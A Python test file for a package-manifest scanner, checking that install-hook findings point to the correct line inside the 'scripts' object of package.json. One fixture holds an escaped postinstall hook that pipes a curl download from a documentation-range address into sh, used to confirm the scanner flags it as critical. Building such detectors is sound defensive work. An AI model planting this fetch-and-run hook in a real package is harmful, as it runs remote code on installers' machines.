"""Review: SC-INSTALL-HOOK was reported at the first line naming the hook.

scan_manifest located a hook by the first line containing `"install"` (or
the other hook names) anywhere in package.json: a dependency called
`install` on line 4 took the finding (and its snippet) instead of the
"scripts" entry on line 7; so did a description mentioning "postinstall".
The line is now the line of the hook's key inside the top-level "scripts"
object, found by a small tokenizer over the parsed document: keys compared
decoded, the last duplicate (the one the parser keeps) wins. Same in the
npm engine's scanManifest; the registry calls this function. Inert content.
"""
import json
import os
import tempfile
import unittest

from lazaret.scanner import core

DEPENDENCY = ('{\n  "name": "x",\n  "dependencies": {\n    "install": "^1.0.0"\n  },\n'
              '  "scripts": {\n    "install": "node-gyp rebuild"\n  }\n}\n')
TRICKY = ('{"description": "run \\"postinstall\\" first", "scripts": {"test": "x"},\n'
          '"config": {"scripts": {"postinstall": "no"}},\n'
          '"scripts": {\n"post\\u0069nstall": "curl http://192.0.2.1/x | sh",\n "prepare": "a",\n'
          '"prepare": "husky install"}, "x": [{"install": 1}]}\n')


def hooks(issues):
    return [(i["line"], i["sev"], i["cmd"]) for i in issues if i["rule"] == "SC-INSTALL-HOOK"]


class HookLineTests(unittest.TestCase):
    def test_a_dependency_named_like_the_hook(self):
        (issue,) = core.scan_manifest("package.json", DEPENDENCY)
        self.assertEqual((issue["line"], issue["sev"]), (7, "MAJOR"))           # was 4
        self.assertEqual(issue["snippet"][issue["line"] - issue["snipStart"]], '    "install": "node-gyp rebuild"')

    def test_escaped_duplicate_and_nested_keys(self):
        self.assertEqual(hooks(core.scan_manifest("package.json", TRICKY)),
                         [(4, "CRITICAL", "curl http://192.0.2.1/x | sh"), (6, "INFO", "husky install")])
        self.assertEqual(core._script_key_lines(TRICKY), {"postinstall": 4, "prepare": 6})

    def test_registry_mode_and_one_line_manifests(self):
        self.assertEqual(hooks(core.scan_manifest("package.json", DEPENDENCY, registry=True)),
                         [(7, "MAJOR", "node-gyp rebuild")])
        one_line = json.dumps({"install": 1, "scripts": {"preinstall": "node a.js", "install": "node b.js"}})
        self.assertEqual([i["line"] for i in core.scan_manifest("package.json", one_line)], [1, 1])

    def test_a_scripts_value_that_is_not_an_object_last(self):
        self.assertEqual(core._script_key_lines('{"scripts": {"install": "a"}, "scripts": null}'), {})
        self.assertEqual(core._script_key_lines('{"scripts": [1], "scripts": {\n"install": "a"}}'), {"install": 2})

    def test_project_scan_with_bom_and_crlf(self):
        with tempfile.TemporaryDirectory() as root:
            with open(os.path.join(root, "package.json"), "wb") as f:
                f.write(b"\xef\xbb\xbf" + DEPENDENCY.replace("\n", "\r\n").encode())
            res = core.scan_project(root)
        self.assertEqual(hooks(res["issues"]), [(7, "MAJOR", "node-gyp rebuild")])


if __name__ == "__main__":
    unittest.main()
